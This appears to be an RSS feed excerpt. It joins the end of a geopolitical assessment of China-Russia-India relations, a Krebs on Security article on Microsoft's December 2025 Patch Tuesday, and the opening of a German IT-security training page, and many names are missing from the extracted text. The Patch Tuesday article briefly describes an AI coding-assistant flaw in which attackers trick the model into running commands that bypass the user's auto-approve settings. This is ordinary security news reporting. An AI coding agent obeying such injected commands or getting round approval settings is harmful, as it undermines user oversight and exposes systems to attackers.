Beijing’s main perceivedthreat — the US. In particular, China almost certainly considers Russia a political, economic, and military partner that helps legitimize China’s narratives about the need for multipolarity and bolster its ability to defend itself from US coercion. China likely considers India an important economic partner and judges that frayed India-US relations diminish the US’s efforts to encircle and contain China.India almost certainly defines its relationships with China and Russia through its doctrine of “strategic autonomy,” in which New Delhi avoids binding security alliances, instead maintaining flexibility in its relationships with global powers while cultivating influence across the developing world. Shaped by its role in founding the Non-Aligned Movement during the Cold War, New Delhi’s engagement with Beijing and Moscow has been a pragmatic balancingact seeking to promote an increasingly multipolar world order while simultaneously fostering ties with the US. India’s approach to China and Russia is also underpinned by a “multi-alignment” policy, which very likely seeks to promote and safeguard India’s core national interests, including economic growth, national security, territorial integrity, regional stability, and global cooperation. Consistent with its strategic independence, New Delhi has cultivated its role as a “neutral centrepiece” between China and the West while avoiding overt alignment with, or opposition to, any particular state.Moscow very likely views its relationships with China and India as beneficial to its core foreign policy goal of enhancing Russia’s global influence by replacing what Moscow sees as a US-centric global system with a multipolar world in which Russia is on equal footing with the US and China. This goal has almost certainly driven Moscow to place increased importance on relationships with non-Western powers, including China and India. Russia’s latest Foreign Policy Doctrine describes this goal as follows:Russia also sees value in expanding economic cooperation with China and India, as Moscow seeks to replace revenue lost due to Western sanctions. The sanctions that the EU and the US have placed on Russia for its annexation of Crimea in 2014 and full-scale invasion of Ukraine in 2022 have made Russia the most sanctioned state in the world.China-Russia: Strategic Partners in Countering the WestIn recent years, China and Russia have become critical strategic partners, with diplomatic, military, economic, and technological engagement deepening. Although tensions almost certainly exist, particularly in their respective intelligence services, close leader relations and convergence on strategic foreign policy objectives –– particularly pushing back against perceived Western hegemony –– means these low-level tensions are unlikely to undermine China and Russia’s overall cooperative trajectory.Chinese and Russian leadership almost certainly see each other as primary strategic partners in advancing the “multipolar” world. In 2023, Xi said to Putin, “We are the ones driving” changes unseen in a century, and multiple jointstatements have noted this goal. Moscow likely views China as having the ability to leverage its significant economic and political influence to amplify Russia’s goal of ushering in a multipolar world with Russia, the US, and China on equal footing. Russia is an advocate for, or a participant in, many of China’s global governance and development initiatives that relate to its goals for a “multipolar” world, including the Global Governance Initiative, Global Security Initiative, and Global Development Initiative.Putin and Xi very likely have a close political relationship, judging from their official statements and the frequency of their visits. Xi and Putin have met over 40 times since 2012 — more frequently than either has met with any other leader. In February 2022, China and Russia declared a “no limits partnership,” and in May 2025, Putin stated that “The comprehensive partnership and strategic cooperation between Russia and China are built on the unshakable principles of equality, mutual support and assistance, as well as the unbreakable friendship between the two states and two nations.” China and Russia’s political alignment has extended to supporting one another at international institutions. For example, they have used their veto powers on the UN Security Council (UNSC) to support one another’s interests, often vetoing resolutions that the other opposes.Although Putin and Xi have a close leader-level relationship and there is significant compatibility between Russia’s and China’s goals of increasing their respective global influence at the US’s expense, mistrust almost certainly exists at lower bureaucratic levels. Their voting alignment in the UN General Assembly and UNSC has decreased by roughly 10% since 2018. Though China has an officially neutral, though in practice somewhat pro-Russia, position on the war in Ukraine, the war very likely has had some negative effects on China, including potential trade disruptions and sanctions (1, 2, 3). Nevertheless, China’s foreign minister reportedly made statements to European Union (EU) officials in July 2025 that conveyed that China, while not supporting Russia militarily, prefers a protracted conflict in Ukraine as it diverts the US’s focus away from China.At least some Russian intelligence officers very likely view China with suspicion, based on a leaked document prepared by the Federal Security Service’s (FSB) Department of Counterintelligence Operations (DKRO) describing China as a significant espionage threat to Russia. Insikt Group lacks context as to the origin and veracity of this memo and whether it reflects unusual levels of concern about Chinese espionage, or simply a recognition by the FSB that Chinese intelligence services –– which are highly capable and aggressive –– are likely to spy on all states, regardless of the level of political cooperation. Even if the memo reflects a concern by the FSB that Chinese espionage might go beyond typical intelligence operations, Putin’s significant control over the Russian bureaucratic apparatus means any misgivings about China among FSB officers are almost certain not to impact the overall China-Russia dynamic.Russia very likely views economic cooperation with China as a means to solidify its overall relationship with Beijing and make up for revenue lost from Western sanctions, as noted above. China likely views its economic relationship with Russia primarily as a means to achieve the political objectives described above, although China likely also benefits from technological partnership and the opportunity to expand trade denominated in Chinese yuan.China has purchased increasingly more Russian oil and gas since Western sanctions went into effect following Russia’s annexation of Crimea in February 2014, diminishing Russia’s ability to sell oil and gas to Western markets. Since Russia invaded Ukraine in 2022, China’s import of Russian oil and natural gas has substantially increased. On September 2, 2025, Russia and China signed a legally binding deal to build the long-delayed Power of Siberia 2 pipeline, which will supply 50 billion cubic meters of gas per year. As of 2023, Russia was China’s top crude oil supplier, and China buys Russian crude oil at a price that is above the G7/EU price cap, further contributing to China’s role in providing Russia with sanctions relief. However, Chinese companies are likely wary of sanction penalties, as seen in reportedly cancelled orders of Russian oil imports following US sanctions in late October 2025.In addition to supporting Russia through increased purchase of Russian oil and gas, Beijing has long allowed –– if not encouraged –– the export of dual-use and military-relevantgoods and expertise. As of mid-2025, dual-use exports to Russia likely have at least slightly decreased from their peak in 2024.Overall trade between China and Russia has also grown significantly since 2014, and particularly since Russia’s full-scale invasion of Ukraine in February 2022. In 2024, total trade reached $245 billion, nearly double that of 2020. The trade balance has been relatively even, with a slight Russian surplus. Russia’s exports to China have mainly consisted of fossil fuels and natural resources, while China’s exports to Russia are primarily manufactured goods such as automobiles, tractors, and electronics. Infrastructure projects –– such as new border crossings –– have helped support increased trade. Technology-oriented research partnerships between Chinese and Russian universities are also expanding, and China and Russia have announced deepening ties for research into information and communication technologies like artificial intelligence and the Internet of Things (IoT).There is also economic friction between China and Russia, though it is likely not significant enough to meaningfully derail deepening bilateral relations. Despite increasing Russian imports, China very likely seeks to avoid overdependence on Russia and has reportedly pressed Russia for cheaper rates. In fall 2024, Chinese financial institutions reportedly began halting transactions with Russian customers, and at least one bank did so as recently as September 2025 after being sanctioned by the EU. In September 2024, China implemented a mechanism to control dual-use goods exports, which may be contributing (alongside threats of US sanctions) to the aforementioned decrease in dual-use exports.Military cooperation between China and Russia has deepened in recent years, likely with the goal of signaling to the West that they could pose a joint military threat –– a development that is very unlikely to materialize –– and likely sharing tactical and strategic intelligence that could help each state achieve its respective military goals. Since 2018, military exercises between China and Russia have become more frequent and more complex, and are expanding into new geographic areas. In 2018, China became the first country outside the former Soviet Union to participate in Russia’s Vostok (East) military exercise, which involved large-scale land and sea operations centered around contingencies in the Pacific. The Vostok 2022 exercise involved a more comprehensive Chinese contingent, as it represented the first time all three Chinese military components — land, sea, and air — participated in a Russian military exercise. In mid-2024, the Chinese and Russian militaries conducted a joint bomber flight into the US’s air defense identification zone (ADIZ) around Alaska for the first time. In September 2025, China and Russia conducted their first joint submarine patrol (or other exercise) in the Sea of Japan and East China Sea. Insikt Group has not identified any instances of declared Russian and Chinese forces deploying together to an active combat zone.In October 2024, Russian Minister of Defense Andrey Belousov met with Chinese military officials in Beijing, after which he stated that Russia and China have “common views, a common assessment of the situation, and a common understanding of what [needs to be done]” to maintain global stability. China’s readout from one of these meetings further indicates that bilateral military cooperation aims to defend China and Russia’s “common interests” and “maintain global strategic stability.”Beyond military exercises, US officials have asserted as recently as September 2024 that Russia, in exchange for support from China for the war effort in Ukraine, is providing military technical support to China in new areas, including in relation to submarine operations, aeronautical design (including stealth), and missile capabilities. The Ukrainian government asserts that China is supplying weapons to Russia, including gunpowder and artillery; that “Chinese representatives” are producing weapons in Russia; and that China is providing Russia with satellite intelligence that supports missile strikes in Ukraine. In January 2023, the US sanctioned a Chinese satellite imagery provider for enabling Russian combat operations. As of September 2025, “Chinese drone experts” were working on military drone development in Russia, according to Reuters. At least two Chinese commercial ships have been involved in Baltic Sea submarine cable-cutting incidents, though Beijing’s involvement in these incidents is unclear.Despite China and Russia’s deepening military relationship, there likely remain limits to the amount of military support Russia is willing to provide to China in the event China is involved in an active conflict such as an invasion of Taiwan. China and Russia have not established a formal alliance or mutual defense pact, so Russia’s level of support would depend on Putin’s calculus. Given the significant resources Russia has devoted to its conflict in Ukraine –– including casualties higher than all conflicts Russia has fought in since World War II combined –– and the fact that Russia does not have a direct stake in the outcome of a Chinese invasion of Taiwan, Russia likely would provide China with only enough support to prevent alienating Beijing. That could include logistical and intelligence support as well as provision of air defense systems such as the S-400.Cooperation in Propaganda and Influence OperationsWe assess China and Russia have deepened their cooperation on overt state propaganda and influence operations, likely because their shared strategic goal of curbing US influence translates into convergence on desired media narratives and disinformation campaigns. Since the early 2000s, China and Russia have increasingly institutionalized their media relationship, including media forums, journalist exchanges activities, co-produced content, and mutually supportive media. In May 2025, China and Russia released a joint statement stating that they would “jointly articulate a common stance in the global media space.”China and Russia have very likely amplified each other’s influence narratives, though we do not have evidence to suggest technical coordination of influence campaigns. Leaked correspondence from the Russian State Television and Radio Company (VGTRK) shows that, since at least 2021, Russia and China have had formal agreements to share content and coordinate content distribution at the ministerial level. In December 2022, a China-linked network of inauthentic activity, Empire Dragon (also known as Spamouflage) spread narratives supporting Russia’s claims that the US is developing biological weapons in Ukraine. Empire Dragon has also likely used a Russia-based social media account reseller, and accounts associated with Empire Dragon have, at times, been used to share Russian inauthentic content. China and Russia have likely used the same inauthentic social media account services to disseminate their influence narratives.Since approximately 2019, China has increasingly used computational propaganda and influence operation tactics likely learned by observing Russia, but whether there is a more formal exchange of methods occurring is unknown. Chinese media outlets consistently frame the Russia-Ukraine war as a US-Russia proxy war, criticize Western hegemony, cast Russia as a rational actor defending its own sovereignty, call Ukraine reckless, and describe the EU as internally fractured. In March 2022, when Meta banned Russian state media outlets from purchasing ads on its platforms, China Global TV Network placed at least 21 pro-Russia advertisements on Facebook in a single month.China-India: Nascent Thaw of Longtime Tension-Filled RelationshipChina-India relations have gone through cycles of cooperation and competition for decades, and have been marked by border tensions since 1962, when China and India fought a war over their contested border. Beijing likely primarily views India through the prism of its broader security environment, and Beijing’s suspicion of India is likely rooted, at least in part, in China’s rivalry with the US and the US’s perceived efforts to encircle China. China’s close relationship with Pakistan, India’s longstanding regional rival, likely also contributes to New Delhi’s wariness of Beijing.In recent months, China-India relations have likely returned to a positive trajectory, driven primarily by high-level diplomatic overtures and deepening trade relations. US tariff policy towards India has likely driven India to pursue improved ties with China. Modi and Xi have framed their countries as “development partners and not rivals,” challenging years of US efforts to bolster India’s role as a counterweight to China’s growing economic and political influence. Modi’s statement following his meeting with Xi on August 31, 2025, noted that “a stable relationship and cooperation” was critical for “the growth and development of the two countries, as well as for a multipolar Asia befitting the trends of the 21st century” — alluding to India’s view that it constitutes a major power center in Asia alongside China. Despite this nascent rapprochement, significant hurdles and unresolved disagreements remain, making it less likely that China and India will form a long-term strategic partnership.China’s approach to India is likely primarily driven by the perceived threats posed by India’s relationship with other powers and perceived anti-China coalitions, rather than cooperation and competition with India on its own terms. Beijing’s perception that a stronger India-US relationship poses a threat to China’s interests is likely a principal factor today. China has sought to consolidate control over disputed border territories, leading to deadly skirmishes with India and cyberattacksagainst Indian critical infrastructure. India’s approach to China has likely been rooted in efforts to curb China’s economic ambitions and regional assertiveness, as well as its longstanding border dispute with China.Over the last year, China and India’s relations have thawed significantly, especially compared to 2020, when the China-India border dispute escalated. In 2024, China and India concluded an agreement that returned the border to its pre-2020 status, thereby completing a disengagement process and reopening border trade. India and China began re-engaging in diplomatic dialogue at the highest level, including a meeting between Modi and Xi on the sidelines of the BRICS summit in Kazan, Russia, in October 2024. In September 2025, Modi visited China for the first time in seven years to attend the 2025 SCO Summit, during which China and India resumed direct commercial flights after a five-year freeze. Chinese Foreign Minister Wang Yi and Indian External Affairs Minister Subrahmanyam Jaishankar emphasized the importance of continued cooperation between the two countries.Despite China and India’s recent diplomatic and economic overtures, tensions remain, particularly around India’s likely suspicions of China’s regional assertiveness and its likely hesitancy to join a persistent anti-Western bloc. Both countries have endorsed the idea of a multipolar world, but Modi has emphasized the need for a multipolar Asia, likely highlighting continuing tensions that stem from China’s economic influence, military power, and international assertiveness. India likely seeks to balance asserting itself as a regional power while maintaining good relations with the US. As such, India has not mirrored Russia and China’s strong advocacy for de-dollarization and replacing the international financial system with one based on China’s currency; it has only supported inter-BRICS trade based on local currency.We assess that China-India economic relations are generally positive, though India took steps to limit Chinese investment during the COVID-19 pandemic and during the 2020 border clashes. In April 2020, India issued Press Note 3, which limited Chinese investment and existing investments; new Chinese foreign direct investment cumulatively fell by approximately 80% in the 2021–2024 period compared to prior to 2021, and the number of active Chinese companies in India declined by nearly 500. For example, India reportedly rejected a proposed $1 billion investment by China’s electric car maker BYD in 2023 over national security concerns, and a visa ban on Chinese tourists reportedly constrained BYD’s lobbying efforts.Despite Indian actions to limit Chinese investment, India’s economy likely remains heavily dependent on Chinese supply chains, which very likely gives Beijing some economic leverage over India.India faces a significant and growing trade deficit with China — reaching $99.21 billion between 2024 and 2025 — and this imbalance has more than doubled in four years. China remains India’s top import source for many goods and commodities critical to its own industrial output, including electronics, telecommunications, electrical products, and machinery.India has taken actions to reduce its dependence on Chinese investment and develop its own competitive advantage. Modi’s administration has bolsteredinvestment in domestic production and implemented protectionist policies, such as the “Make in India” policy, the Production-Linked Incentive (PLI) scheme, and, most recently, the “National Manufacturing Mission.” Threatening China’s economic and technological interests, India banned hundreds of Chinese-developed mobile applications and has pursuedefforts with the US to develop advanced technology supply chains. China has pushed back against some of these efforts. For example, China may have sought to impede Apple from moving its supply chain for US phones from China to India.Another area of tension in the China-India economic relationship is very likely China’s increasing investment in South Asia, which conflicts with India’s “Neighbourhood First” policy, in which India views the region as its primary sphere of influence. The policy, considered a “defining subset of its overall foreign policy,” hinges on India fostering connectivity, trade, and stability across the region. India likely perceives China’s engagement in South Asia as an effort to exert dominance in a region vital to India’s strategic interests. India almost certainly opposes China’s Belt and Road Initiative (BRI) because New Delhi views China’s strategy –– an expansive development and investment project originally devised to construct infrastructure linking East Asia and Europe –– as seeking to dominate the region and counter India’s regional influence, posing a direct threat to Indian sovereignty. A specific point of contention is the China-Pakistan Economic Corridor (CPEC) — a 3,000-kilometer, over $60 billion project linking China and Pakistan through roads, railways, and pipelines — which India almost certainly perceived as the most immediate threat to Indian sovereignty, as it runs through disputed territory in Pakistan-occupied Kashmir. The CPEC aims to facilitate Chinese energy imports while strengthening Pakistan’s economy and strategic connectivity, and Beijing’s backing of Islamabad with resources and infrastructure is likely a major concern for India.Despite tensions, the value of China’s annual exports to India was greater between 2020 and 2024 than between 2016 and 2020, and was approximately $20 billion more in 2021 than in 2018. The total value of foreign direct investment from China into India also returned to an upward trajectory after 2021, and particularly in 2024. Multilateral fora such as BRICS and the Asian Infrastructure Investment Bank (AIIB) likely provide additional mechanisms for economic cooperation. China launched the AIIB in 2016, and the bank has dozens of approved projects in India.We assess that, since 2020, the China-India military dynamic has centered primarily around a longstanding border dispute and each state’s suspicions of the other’s regional ambitions.India and China share a contested 3,440-kilometer (2,100-mile) border in the Himalayas over which the two countries have had an ongoing, historic dispute. The two states compete to build infrastructure along the border, known as the Line of Actual Control. The border rivalry devolved into open confrontation in the Galwan Valley in June 2020, resulting in the deaths of twenty Indian and four Chinese soldiers. Four years of tension followed, during which each side built up troops in the contested areas. After at least 21 rounds of Senior Highest Military Commander Level (Corps Commander) talks and other efforts, India and China signed an agreement in 2024, which led to the disengagement of troops. Even with border tensions currently defused, the overarching territorial dispute very likely persists as a potential strategic flashpoint in the future. As such, military cooperation is unlikely; after the 2025 SCO summit, Modi did not attend the military parade organized in Beijing to commemorate the 80th anniversary of the end of World War II.In addition, China’s efforts to assert military power via naval exercises in the Indian Ocean Region (IOR) are likely a particular point of contention between China and India. China’s People’s Liberation Army (PLA) is increasingly active throughout the IOR, often as part of air, land, and sea-based multilateral exercises but also to support the PLA Navy’s “Far Seas Protection” strategy. In addition to military exercises, the PLA makes use of commercial ports in the IOR, some of which are owned or operated by Chinese state-owned enterprises. New Delhi very likely perceives China’s regional cultivation of dual-use commercial ports, naval base in Djibouti, and likely naval facility access in Cambodia — sometimes referred to as a “string of pearls” strategy by analysts outside of China — as an encirclement of India in what New Delhi considers its regional maritime domain. This competition has played out at ports across the region. For example, in 2022, China and India competed to influence Sri Lanka’s decision regarding China’s request to dock a military vessel at the China-owned and operated Port of Hambantota; the ship ultimately called at the port over New Delhi’s objections. In 2023, India objected to the presence of a Chinese state-owned research vessel, which China very likely uses to support PLA requirements. In support of their territorial claims and very likely to facilitate military contingencies, China and India have worked to build out relevant infrastructure along disputed border areas.Finally, China likely views New Delhi’s joint military exercises with third parties as evidence that India is preparing for a China contingency. In 2022, an annual exercise with the US took place just 62 miles from a disputed border area. In 2024, India organized the first Tarang Shak air combat exercise that involved ten countries, including the US. In 2025, India and the Philippines conducted a joint naval drill in the South China Sea. India almost certainly views China’s military cooperation and integration with Pakistan –– including China’s role as Islamabad’s main supply of arms –– as a grave threat to Indian security. China is responsible for 81% of Pakistan’s arms imports.India-Russia Relationship: Longstanding and Rooted in Arms Sales and TradeIndia and Russia have had a close partnership since at least the 1950s, very likely anchored by a mutual desire to push back against perceived US hegemony, Russian arms sales to India, and, more recently, an increase in Indian purchases of Russian oil. In 2010 and 2024, India and Russia defined their relationship as a “Special and Privileged Partnership.” Following a July 2024 summit, Modi and Putin issued a statement calling the India-Russia partnership a “time-tested relationship which is based on trust, mutual understanding and strategic convergence.”India and Russia’s political partnership very likely dates back to at least the 1950s, when the Soviet Union used its UN veto to support India’s claims on Kashmir, and is anchored by a shared strategic interest in re-balancing post-Cold War US hegemony in favor of a multipolar world order. New Delhi has called Moscow “key to India’s quest for a stable Asian balance of power.” However, India and Russia’s visions for what a multipolar world looks like very likely differ. India’s principle of multi-alignment aims to reform global power dynamics and is not anti-West, in contrast to Russia’s goal of ushering in a world in which Russia, China, and the US are on equal footing. Indian Foreign Minister Subrahmanyam Jaishankar has articulated that India’s “non-West” character does not mean it is “anti-West.” Jaishankar’s book on India’s foreign policy, , asserts that India’s approach that distanced itself from the West “has led [India] to develop dependencies elsewhere” — yet specifically asserts that India “must realize that there is little profit in being anti-West.”India’s diplomatic approach to Russia suggests it is willing to occasionally compromise on its declared neutral, non-aligned strategy. India abstained on multiple UN resolutions relating to Russia’s invasion and Ukraine’s sovereignty, has not taken a condemnatory stance against Russia’s invasion of Ukraine, and consistently calls for a “peaceful resolution through dialogue and diplomacy.” Modi and Putin have publicly maintained a warm friendship despite US and European criticism of Russia, and Modi has referred to Russia as India’s “all-weather friend and trusted ally.”Russia very likely views India as a critical, longstanding market for Russian weapons and, increasingly since Russia’s full-scale invasion of Ukraine in 2022, an economic partner that helps Russia recoup revenue lost due to Western sanctions. India’s import of crude oil from Russia increased from $2.3 billion in 2021 to $52.7 billion in 2024, despite Western sanctions on Russia. India’s Ministry of External Affairs has stated that India “does not subscribe to any unilateral sanctions measures,” and “considers the provision of energy security a responsibility of paramount importance to meet the basic needs of its citizens.” Since 2023, Russia has been India’s top supplier of crude oil, and Russian oil exceeded 40% of India’s overall crude imports by May 2025. As a result, India is now the second-largest purchaser of Russian crude oil after China. Discounted Russian oil has fueled India’s surging energy needs and enabled it to become the third-largest exporter of refined petroleum products, which is India’s most exported product. Even after US President Donald Trump placed a 50% tariff to dissuade India from continuing to buy Russian oil, Indian oil imports remained steady in the first half of September 2025. The US subsequently imposed sanctions on Russian oil exporters Lukoil and Rosneft on October 22, 2025, prompting Indian refiners to pause new orders and seek alternatives for sanctioned Russian oil. On October 28, an India-bound tanker carrying Russian crude turned around in the Baltic Sea — an incident that oil analysts attributed to the US sanctions pressure. However, Indian Oil continued to purchase Russian crude from non-sanctioned entities, suggesting the US sanctions are likely to impact, but not halt, India’s imports from Russia.Total trade between India and Russia amounted to $68.7 billion in FY2025, likely surging as a result of the vacuum left by Western firms. However, India’s imports from Russia account for $63.8 billion, over 90% of the total trade, reflecting a significant trade imbalance. Even so, New Delhi aims to achieve $100 billion in trade with Russia by 2030. Both countries seek to reduce reliance on the US dollar, and 90% of trade is now settled in ruble-rupee transactions. However, India’s trade with the West will likely complicate financial integration; India has been hesitant to adopt sanctions-resistant payment networks with Russia and has dismissed the idea of replacing the US dollar.We assess that India and Russia’s military relationship is centered on Russia’s long history of exporting weapons to India, which has created an Indian dependence on Russian systems. Over the past twenty years, India has purchased roughly $60 billion in Russian weapons, amounting to 65% of its total weapons imports. India’s purchases include Russia’s S-400 missile defense system, which India used in May 2025 to repel Pakistani missile attacks. India and Russia have also pursued joint production of weapons, including T-90 tanks and Su-30MKI aircraft. India-Russia military cooperation has stagnated on other fronts, such as joint training and exercises.Although Moscow continues to be India’s main arms supplier, India’s arms purchases from Russia have declined since 2024, as India has sought to reduce its reliance on Russia and increasingly purchase from Western suppliers, including France, Israel, and the US. On October 31, 2025, India and the US signed a ten-year Defense Framework Agreement, which Indian Defense Minister Rajnath Singh described as the start of a “new chapter” in India-US defense cooperation and “a signal of our growing strategic convergence.” This agreement likely reflects India’s intent to continue diversifying its military cooperation and arms trade beyond Russia, and shore up its US partnership amid tariff-related strife — further reinforcing the multi-alignment doctrine driving India’s security calculations and reducing the likelihood of a Russia-India-China military alliance.The documented poor performance of Russian weapons systems in Ukraine likely impacts India’s calculus. A leak by hacker collective “Black Mirror” revealed internal documents from Russia’s state-owned defense conglomerate Rostec detailing how the Russian-manufactured radar system installed in India’s MiG-29K fighter aircraft suffered extensive and systemic failures between 2016 and 2019; this lack of reliability likely encouraged India’s move away from Russian weapons.State of the Nascent Trilateral Dynamic and Indicators of Deepening Trilateral CooperationChina, India, and Russia have not declared a formal bloc; instead, in recent months, the three states have taken primarily diplomatic steps to project increased interest in trilateral engagement –– most notably a meeting between Modi, Putin, and Xi at the 2025 SCO Summit. Though the three states did not make any concrete commitments at the summit, the meeting represents the first time all three leaders have met in person since 2019, and very likely reflects an effort by Russia and China to exploit strains in the US-India relationship to draw India away from the US.Past trilateral engagement, which has primarily occurred at multilateral fora such as BRICS, SCO, and G20 Summits, has not resulted in a solidified, institutionalized trilateral bloc due to divergent national interests that will likely pose a long-term structural impediment. These strategic differences will likely persist and continue to limit the depth and breadth of alignment among the three countries, making it less likely that a solidified trilateral bloc will emerge in the short term. The three primary multilateral fora where trilateral engagement –– short of formation of a bloc –– has occurred are the now-dormant RIC format, BRICS, and the SCO.RIC Format: Dormant, Though Russia and China Are Interested in Reviving ItThe RIC format is likely the multilateral forum in which trilateral engagement would primarily take place, given the apparent interest of Beijing and Moscow in reviving the dormant discussion format and New Delhi’s apparent reserved openness to the possibility. The RIC format, which began formally in 2007 and involves trilateral discussions among the foreign ministers of these countries, has been inactive since late 2021.Between 2002 and 2020, twenty trilateral ministerial-level meetings occurred, covering topics such as trade, energy, and disaster management. At the most recent RIC foreign ministers meeting in November 2021, the three countries expressed interest in regular high-level meetings, reiterated the importance of international reform for a multipolar and rebalanced world, and opposed unilateral sanctions imposed outside of the UNSC.In a 2022 joint statement, China and Russia declared their intent to develop cooperation within the RIC format, a sentiment Russian Foreign Minister Sergey Lavrov reiterated in May 2025. In July 2025, an Indian government spokesperson neither rejected nor explicitly supported the revival of the RIC format, likely indicating India’s reserved openness to it.BRICS: Ill-Equipped to Institutionalize Trilateral Engagement, Though Opportunities Remain for Economic EngagementThe BRICS (Brazil, Russia, India, China, and South Africa) bloc is active, though very likely ill-equipped to facilitate the institutionalization of a trilateral Russia-India-China bloc due to its status as an informal coordinating body, as opposed to an organization that requires mutual commitments. BRICS was formed in 2009 and is an organization committed to perpetuating a multipolar world via political, security, and economic cooperation.Though Russia and China have sought to make BRICS a geostrategic bloc to rival the West, the organization does not bind its member states to any treaty, alliance, or formal legal structure, thereby limiting the organization’s ability to institutionalize a geostrategic bloc. India views the forum as a key balancing factor in its nuanced multi-alignment strategy, in which New Delhi seeks to position itself as a bridge between Western and non-Western fora.Despite the overall limitations of the BRICS structure, the connectivity it provides for financial institutions likely raises the possibility of BRICS facilitating trilateral economic integration, should China, India, and Russia choose to pursue that sort of cooperation. BRICS has established two financial institutions, both of which are based on foundational treaties. The New Development Bank (NDB) supports collaborative development projects in emerging markets and developing countries, and the Contingent Reserve Arrangement ensures BRICS’s central banks provide mutual support during a currency crisis. BRICS’s interconnected financial systems could facilitate trilateral economic activity and offer a way for the three countries to conduct trade payments.We assess that BRICS could also facilitate Russia and China’s efforts to develop alternatives to the US dollar, though India’s hesitation to aggressively push for de-dollarization likely limits the extent to which de-dollarization will become an area for trilateral engagement. BRICS nations have explored the development of a common currency and have specifically created a cross-border digital payment and messaging system backed by cryptocurrency, called BRICS Pay. During the July 2025 BRICS summit in Rio de Janeiro, Brazil, member countries reportedly made progress in “identifying possible pathways to support the continuation of discussions on the potential for greater interoperability of BRICS payment systems.”Shanghai Cooperation Organization (SCO): Encumbered by Competing InterestsDespite the fact that Russia, India, and China’s latest trilateral engagement took place at the SCO Summit in 2025, the SCO is unlikely to facilitate a deeper trilateral relationship, as it is encumbered by competing interests. The SCO was founded in 2001 to focus on border security and ethnic minority separatism in China’s Xinjiang region, though it has since expanded to encompass counter-drug trafficking efforts, coordination in support of economic development, wider security-relevant matters, and other activities. India joined in 2017, after being an observer since 2005, with Russia’s support and possibly without China’s, as Beijing sponsored Pakistan’s membership that same year.China and Russia have used the SCO to advance their geopolitical aims, including shaping future multipolarism and projecting power. In particular, China uses the SCO as a foundation for expanding an international security architecture that is consistent with the CCP’s regime security.We assess that the SCO’s institutional capacity to take unified action is limited, in part by the fact that its members are not consistently aligned. For example, India initially did not participate in crafting a SCO statement criticizing Israeli and US strikes against Iran in June 2025, although it later joined a different SCO statement condemning the same activities. The SCO did not stop China-India border clashes in 2020, although it helped facilitate bilateral discussions. Following the 2025 clashes between India and Pakistan, India reportedly objected to an SCO statement it viewed as undermining its own position. According to one Chinese think tank director, India is using the SCO to contain China’s influence and push back on its development and security initiatives, such as the BRI.Indicators of Deeper Trilateral CooperationThe table below highlights potential indicators of increasing trilateral cooperation in the future, as well as the factors most likely limiting trilateral cooperation today and going forward. China-India tension is very likely the primary constraint to the development of a trilateral bloc.]]></content:encoded></item><item><title>Microsoft Patch Tuesday, December 2025 Edition</title><link>https://krebsonsecurity.com/2025/12/microsoft-patch-tuesday-december-2025-edition/</link><author>BrianKrebs</author><category>security</category><pubDate>Tue, 9 Dec 2025 23:18:29 +0000</pubDate><source url="https://krebsonsecurity.com/">Krebs on Security</source><content:encoded><![CDATA[ today pushed updates to fix at least 56 security flaws in its  operating systems and supported software. This final Patch Tuesday of 2025 tackles one zero-day bug that is already being exploited, as well as two publicly disclosed vulnerabilities.Despite releasing a lower-than-normal number of security updates these past few months, Microsoft patched a whopping 1,129 vulnerabilities in 2025, an 11.9% increase from 2024. According to  at , this year marks the second consecutive year that Microsoft patched over one thousand vulnerabilities, and the third time it has done so since its inception.The zero-day flaw patched today is CVE-2025-62221, a privilege escalation vulnerability affecting  and later editions. The weakness resides in a component called the “Windows Cloud Files Mini Filter Driver” — a system driver that enables cloud applications to access file system functionalities.“This is particularly concerning, as the mini filter is integral to services like OneDrive, Google Drive, and iCloud, and remains a core Windows component, even if none of those apps were installed,” said , lead software engineer at .Only three of the flaws patched today earned Microsoft’s most-dire “critical” rating: Both CVE-2025-62554 and CVE-2025-62557 involve , and both can exploited merely by viewing a booby-trapped email message in the Preview Pane. Another critical bug — CVE-2025-62562 — involves , although Redmond says the Preview Pane is not an attack vector with this one.But according to Microsoft, the vulnerabilities most likely to be exploited from this month’s patch batch are other (non-critical) privilege escalation bugs, including:, senior director of threat research at , said privilege escalation flaws are observed in almost every incident involving host compromises.“We don’t know why Microsoft has marked these specifically as more likely, but the majority of these components have historically been exploited in the wild or have enough technical detail on previous CVEs that it would be easier for threat actors to weaponize these,” Breen said. “Either way, while not actively being exploited, these should be patched sooner rather than later.”One of the more interesting vulnerabilities patched this month is CVE-2025-64671, a remote code execution flaw in the Github Copilot Plugin for Jetbrains AI-based coding assistant that is used by Microsoft and GitHub. Breen said this flaw would allow attackers to execute arbitrary code by tricking the large language model (LLM) into running commands that bypass the user’s “auto-approve” settings.CVE-2025-64671 is part of a broader, more systemic security crisis that security researcher  has branded IDEsaster (IDE  stands for “integrated development environment”), which encompasses more than 30 separate vulnerabilities reported in nearly a dozen market-leading AI coding platforms, including , , , and .The other publicly-disclosed vulnerability patched today is CVE-2025-54100, a remote code execution bug in  on Windows Server 2008 and later that allows an unauthenticated attacker to run code in the security context of the user.For anyone seeking a more granular breakdown of the security updates Microsoft pushed today, check out the roundup at the SANS Internet Storm Center. As always, please leave a note in the comments if you experience problems applying any of this month’s Windows patches.]]></content:encoded></item><item><title>Trainings und Workshops</title><link>https://security.lauritz-holtmann.de/training/</link><author>(Dayzerosec.com)</author><category>vulns</category><pubDate>Tue, 9 Dec 2025 21:59:01 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[Gerne unterstütze ich Sie als Freelancer bei der Erarbeitung und Durchführung maßgeschneiderter Workshops und Trainings:

In einer Zeit, in der durch _Vibe-Coding_ Proof-of-Concept-Anwendungen nur wenige Prompts entfernt sind, ist es essenziell, dass Mitarbeitende in Unternehmen regelmäßig geschult werden, um ein Bewusstsein für IT-Sicherheit zu schaffen und dieses aufrechtzuerhalten. Hierbei biete ich maßgeschneiderte Workshops und Trainings zu verschiedenen Themen rund um IT-Sicherheit an. Diese können sowohl remote als auch vor Ort in Ihrem Unternehmen durchgeführt werden.

Mein Ziel ist es, praxisorientiertes Wissen zu vermitteln, das direkt im Arbeitsalltag angewendet werden kann. Dabei lege ich großen Wert darauf, die Inhalte an die spezifischen Bedürfnisse und den Kenntnisstand der Teilnehmenden anzupassen. Auch Hands-on-Übungen und interaktive Elemente sind fester Bestandteil meiner Trainings.

### Über mich

